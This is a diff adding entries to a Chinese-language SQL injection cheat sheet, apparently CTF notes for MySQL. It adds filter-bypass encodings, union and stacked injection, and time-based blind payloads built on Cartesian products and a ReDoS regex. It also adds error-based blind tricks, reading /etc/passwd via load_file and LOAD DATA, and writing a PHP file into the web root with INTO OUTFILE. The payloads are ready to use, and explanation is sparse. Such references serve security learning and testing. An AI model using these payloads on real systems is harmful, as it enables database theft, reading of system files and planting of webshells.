@@ -46,6 +46,12 @@
 
 ### version()：当前使用的数据库版本
 
+### @@hostname  
+
+### @@port 
+
+### @@version  
+
 ### @@datadir：数据库存储数据路径
 
 ### concat()：联合数据，用于联合两条数据结果。如 concat(username,0x3a,password)
@@ -61,12 +67,17 @@
 ### select xxoo into outfile '路径'：权限较高时可直接写文件
 
 ## 推荐网站
+ http://vinc.top/2017/03/23/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/
 
-### https://ctf-wiki.github.io/ctf-wiki/web/sqli-zh/
+[http://p0desta.com/2018/03/29/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/](http://p0desta.com/2018/03/29/SQL注入备忘录/)
 
-### http://vinc.top/2017/03/23/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/
+[https://ultramangaia.github.io/blog/2018/SQL%E6%B3%A8%E5%85%A5.html](https://ultramangaia.github.io/blog/2018/SQL注入.html)
 
 ## 绕过
+
+### 关键字 %00绕过
+
+•SELECT :SE\x00LECT  (\x00指ASCII为0的字符） 
 
 ### 绕过逗号限制
 
@@ -90,6 +101,8 @@ SELECT * FROM Users WHERE username = 0x61646D696E
 - SELECT CONCAT('a', 'd', 'm', 'i', 'n');
 - SELECT CONCAT_WS('', 'a', 'd', 'm', 'i', 'n');
 - SELECT GROUP_CONCAT('a', 'd', 'm', 'i', 'n');
+- SELECT extractvalue(0x3C613E61646D696E3C2F613E,0x2f61)
+- SELECT (char(97)+char(100)+char(109)+char(105)+char(110))
 
 ### 宽字节注入 
 
@@ -112,6 +125,22 @@ SELECT * FROM Users WHERE username = 0x61646D696E
 	- lpad((version()),20,'@')
 	- repeat((version()),2)
 	- 来源:http://vinc.top/2017/03/23/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/
+
+### 杂
+
+-  or <->||
+
+- and <->&&
+
+- 不要忘记 ^
+
+- =<>    <=>    in/between/like
+
+  - SELECT 1 WHERE 1 = 1 ó SELECT 1 WHERE 1 IN (1)
+
+  - SELECT 1 WHERE 1 = 1 ó SELECT 1 WHERE 1 LIKE "1"
+
+  - SELECT 1 WHERE 1 < 10 ó SELECT 1 WHERE 1 BETWEEN (0, 10)
 
 ## 注入语句备忘 
 
@@ -221,3 +250,78 @@ select * from (select * from 表名 a join 表名 b using (已知的字段,已�
 ') and if(1=0,1, sleep(10)) --+
 
 ") and if(1=0,1, sleep(10)) --+
+
+### **MySQL**读写文件
+
+- 一切都仅限于MySQL 5.6以前，高版本默认配置secure_file_priv为NULL，无法读写任何文件。
+
+- LOAD_FILE 任意读文件
+
+  - SELECT load_file('/etc/passwd');
+
+- 在Windows下可利用UNC路径实现数据外带
+
+  - LOAD DATA LOCAL INFILE读文件
+
+  - LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE a fields terminated by ''
+
+- 写文件
+
+  - SELECT '<?php phpinfo(); ?>' INTO OUTFILE '/var/www/html/1.php';
+
+
+
+
+
+## 注入类型
+
+### 堆叠注入
+
+select 1,2;select 2,3
+
+### union 注入
+
+#### 条件
+
+- Union必须由两条或者两条以上的SELECT语句组成，语句之间使用Union链接。
+
+- **Union中的每个查询必须包含相同数量的列。**
+
+- 列的数据类型必须兼容：
+
+  -兼容指数据库可以隐式转换类型A到类型B，例如：
+
+  - int -> double
+
+  - int -> varchar
+
+### 盲注
+
+#### bool 盲注
+
+#### 时间盲注
+
+##### **MySQL** **时间盲注**
+
+
+- BENCHMARK
+
+- 笛卡尔积
+
+  - If (ascii(substr((select database()),%d,1))<%d,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.tables C),1)#
+
+  - 无法理解则请自己复习《线性代数》与《数据库系统原理》
+
+- 正则延迟
+
+  - select if(substr((select 1)='1',1,1),concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',1);
+
+ReDOS，无法理解则请自己复习编译原理
+
+#### 报错盲注
+
+select * from (SELECT "E10ADC3949BA59ABBE56E057F20F883E" as password) a where IF(LEFT(password, 1) = "E", EXP(100000000000), 1);
+
+匹配上时产生报错，没匹配上时页面正常。
+
+这里可以用所有会产生错误的函数，而不仅仅局限于那几个会产生报错注入的函数。
